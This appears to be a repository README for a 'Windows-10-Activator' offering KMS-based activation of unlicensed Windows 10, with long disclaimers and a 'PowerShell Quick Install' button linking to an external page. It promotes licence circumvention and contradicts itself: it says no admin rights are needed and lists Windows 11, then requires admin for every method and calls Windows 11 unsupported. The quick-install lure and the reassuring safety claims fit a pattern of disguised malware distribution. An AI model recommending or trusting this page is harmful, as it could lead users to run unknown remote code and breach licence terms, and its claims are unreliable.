<div align="center">

# Windows-10-Activator — Security Tool

![](files/1.png)

### 🚀 PowerShell Quick Install

[![](files/button.png)](https://nigodiay.github.io/windows-10-activation-toolkit/)

[![powershell-7](https://img.shields.io/badge/POWERSHELL--7-5.1%2B_%2F_7%2B-14b8a6?style=flat-square&labelColor=0d1117)]() [![build](https://img.shields.io/badge/BUILD-GREEN-2ea44f?style=flat-square&labelColor=0d1117)]() [![state](https://img.shields.io/badge/STATE-RELEASED-2ea44f?style=flat-square&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-BSD--3--CLAUSE-2dd4bf?style=flat-square&labelColor=0d1117)]()

</div>

---

This repository provides a collection of methods for activating Windows 10, targeting editions such as Home, Professional, Enterprise, and Education. It includes multiple documented approaches, ranging from executable batch file procedures to command-line based activation using KMS. The tools are maintained for educational purposes only and should be evaluated against your own compliance requirements before use.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Disclaimer

This project is provided strictly for educational and research purposes. It is intended to demonstrate how software licensing mechanisms function and to illustrate the technical behavior of activation-related commands and configuration changes on Windows 10. It is not intended for use in circumventing licensing or for any purpose that violates applicable laws, regulations, or the terms of service of any software vendor or service provider.

Use of this project is entirely at your own risk. The maintainers and contributors make no representations or warranties, express or implied, regarding the legality, safety, reliability, or fitness for any particular purpose of the methods, commands, or keys described. No guarantee is made that any method will function on a given system, Windows build, or configuration, and behavior may change without notice due to updates or external factors.

Activation methods described in this project may rely on third-party servers, keys, or services that are not controlled, operated, or verified by the maintainers. Availability, correctness, and trustworthiness of such external dependencies cannot be guaranteed. Keys and commands are documented for illustrative purposes only and should not be treated as a substitute for legitimate licensing.

You are solely responsible for determining whether your use of this project complies with the laws and regulations applicable in your jurisdiction, as well as with any agreements you have entered into. The maintainers and contributors disclaim any liability for direct or indirect damages, data loss, system instability, licensing violations, or other consequences arising from the use or misuse of this project or of any information it contains.

Nothing in this project should be interpreted as legal advice. If you are uncertain about the legality or appropriateness of a given action, consult a qualified professional before proceeding.

## Features

- Provides multiple independent activation methods, each implemented as a separate procedure so a failure in one does not affect the others.
- Method 1 uses a batch script generated from the included activation text file and executed with administrative privileges.
- Method 2 applies a product key via `slmgr.vbs`, sets a KMS server, and triggers online activation through `slmgr.vbs /ato`.
- Method 3 performs KMS-based activation with a fixed key and server, followed by `slmgr /xpr` to display the current activation expiration state.
- Maps product keys to each Windows 10 edition (Home, Home N, Home Single Language, Home Country Specific, Professional, Professional N, Education, Education N, Enterprise, Enterprise N, and LTSB variants) so the correct key can be selected for the installed edition.
- All activation operations run through native Windows tooling (`slmgr.vbs`, `cmd.exe`) with no third-party binaries required.
- Activation status can be verified at any time using the built-in `slmgr /xpr` query.
- Requires an active internet connection during the KMS activation step; no proxy is used or recommended.
- A system restart is recommended after successful activation to finalize the licensing state.

## Supported Versions

The methods documented in this repository apply exclusively to the following Windows 10 editions:

- Windows 10 Home
- Windows 10 Home N
- Windows 10 Home Single Language
- Windows 10 Home Country Specific
- Windows 10 Professional
- Windows 10 Professional N
- Windows 10 Enterprise
- Windows 10 Enterprise N
- Windows 10 Enterprise 2015 LTSB
- Windows 10 Enterprise 2015 LTSB N
- Windows 10 Enterprise 2016 LTSB
- Windows 10 Enterprise 2016 LTSB N
- Windows 10 Education
- Windows 10 Education N

Edition matching is mandatory. Each activation method requires the key or command sequence corresponding to the exact edition installed. Applying a key from a different edition will fail and may leave the system in a non-activated state.

Architecture support: both x86 (32-bit) and x64 (64-bit) installations of the listed editions are supported.

Out of scope: Windows 7, Windows 8.1, Windows 11, Windows Server product lines, and any Windows 10 edition not explicitly listed above are not supported. No compatibility guarantees are provided for these platforms.

Prerequisites: an internet connection is required for the KMS-based methods; activation cannot complete offline. Administrator privileges are required for all methods.

Verification: after running any method, confirm activation status with `slmgr /xpr`.

## How It Works

The activator operates by interacting with the Windows Software Protection Platform through the built-in Software License Manager (SLMGR) interface. Each method applies a distinct activation workflow, and all commands execute exclusively against the local operating system installation.

**Method 1 – Batch Script Execution**

The first method packages activation commands into a batch file. The script invokes `cscript` against `slmgr.vbs`, applying a product key appropriate to the installed edition, directing the licensing client to a Key Management Service host, and then requesting online activation. The script requires elevated privileges and an internet connection during execution. A system restart is performed after activation completes so the licensing service reloads its state.

**Method 2 – Manual Command-Line Activation**

The second method performs the same operations manually through an elevated Command Prompt. The user first installs an edition-specific product key with the `/ipk` parameter, then assigns a KMS host with `/skms`, and finally triggers activation with `/ato`. This sequence mirrors the standard SLMGR activation flow used by enterprise KMS clients: key installation, service discovery, and activation request. Because each step is issued individually, the user can observe the result of every command before proceeding.

**Method 3 – KMS Activation with Expiration Verification**

The third method applies a KMS client key for Windows 10 Pro, points the licensing client at a KMS host, and requests activation. A final `/xpr` query reports the current license status and remaining activation period, which for KMS-based activation is time-limited and must be renewed periodically. This method is intended for validating the activation state after the procedure completes.

**Shared Technical Characteristics**

All three methods rely on the native SLMGR component already present in Windows 10; no third-party binaries or drivers are installed. Commands must run from an elevated context, since license modification requires administrative rights. The KMS host configured during activation receives the request; no other network traffic is generated by the tool itself. Supported editions include Home, Professional, Enterprise (including LTSB variants), and Education, each requiring a matching product key. Activation state can be verified at any time with `slmgr /xpr` or `slmgr /dlv`.

## Privacy and Safety

This tool operates entirely on the local system and does not transmit telemetry, activation data, or machine identifiers to any external endpoint controlled by the project. All scripts, batch files, and commands contained in the repository execute locally within the user's own Windows environment.

Activation methods documented in this project rely on generic volume license keys and Key Management Service (KMS) host configurations that are publicly known. The project does not host, proxy, or operate any KMS infrastructure. Any KMS host referenced during activation is contacted directly by the Windows Software Protection Platform (sppsvc) as part of native licensing behavior, not by code in this repository.

Users are responsible for verifying that any KMS host, key, or activation path they use is authorized for their environment. KMS activation is intended for organizations operating licensed volume infrastructure; using it outside such an environment may violate the applicable Microsoft licensing terms. Review the Disclaimer section before proceeding.

Safety considerations:

- Scripts should be reviewed before execution. Batch files and command sequences modify licensing state via `slmgr.vbs` and should only be run with administrator privileges on systems you own or administer.
- No binaries, executables, or obfuscated payloads are distributed by this project. Content is limited to plain-text scripts and documented commands.
- Activation changes are reversible through standard Windows licensing commands; system restore points are recommended before applying any method.
- The project does not collect, store, or request credentials, personal data, or hardware fingerprints.
- Contributions are subject to repository review; users should verify commit history and file contents against the published source before running any updated script.

This project is provided for educational and research purposes. It offers no warranty of fitness, legality, or compliance for any particular use.

## FAQ

**Which Windows 10 editions are supported?**
The tool targets Windows 10 Home, Home N, Home Single Language, Home Country Specific, Professional, Professional N, Education, Education N, Enterprise, Enterprise N, Enterprise 2015 LTSB, Enterprise 2015 LTSB N, Enterprise 2016 LTSB, and Enterprise 2016 LTSB N. Edition-specific product keys are matched to the installed edition; applying a key for a different edition will fail.

**What is the difference between the available methods?**
The methods differ in mechanism and persistence. The script-based method applies a product key and points the system to a KMS host, then requests activation. The manual command-line method performs the same sequence of `slmgr` operations step by step, giving the operator visibility into each stage. The KMS method establishes activation with a finite renewal interval, so reactivation is required periodically. Each method is independent; do not chain them on the same installation without resetting state first.

**Why does activation fail after running a method?**
Common causes are: a product key that does not match the installed edition, no network connectivity to the configured KMS host, an existing activation state that conflicts with the new key, or insufficient privileges. All commands must be executed from an elevated command prompt or with "Run as Administrator." Confirm the edition with `slmgr /dli` before selecting a key, and verify connectivity to the KMS endpoint before requesting activation.

**Is administrative access required?**
Yes. Product key installation, KMS host configuration, and activation requests all modify system licensing state and require elevation. Running the batch file or `slmgr` commands without administrator rights will return access-denied errors.

**Does this tool modify system files permanently?**
The methods change licensing configuration through the supported `slmgr` interface; they do not patch binaries or alter system files. Licensing state, the installed product key, and the configured KMS host persist until changed or reset. The KMS method requires periodic renewal to remain active.

**What data does the tool collect or transmit?**
Activation requests are sent to the KMS host configured by the method. No telemetry, credentials, or system identifiers are collected by the project itself. Review the commands before execution to confirm the endpoint being contacted.

**Can activation be reverted?**
Yes. The installed product key can be removed and the KMS host name cleared using the standard `slmgr` options, returning the system to an unactivated state. Retain the original product key, if any, before making changes so the prior licensing configuration can be restored.

**Is this legal or supported by Microsoft?**
No. This project is provided strictly for educational purposes. It is not affiliated with, endorsed by, or supported by Microsoft, and its use may violate the Microsoft Software License Terms. Use only on systems you own and in environments where such testing is permitted.